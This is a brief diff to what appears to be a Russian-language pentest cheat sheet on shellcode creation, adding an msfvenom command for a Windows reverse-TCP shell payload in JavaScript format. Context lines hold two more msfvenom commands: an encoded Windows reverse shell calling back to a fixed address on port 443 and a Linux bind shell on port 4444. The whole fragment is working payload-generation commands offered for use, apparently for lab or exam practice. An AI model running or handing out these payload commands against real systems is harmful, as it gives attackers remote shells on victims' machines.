@@ -52,6 +52,7 @@ nasm >
 
 Создание shellcode:
 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
 msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 EXITFUNC=thread -f c -a x86 --platform linux -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
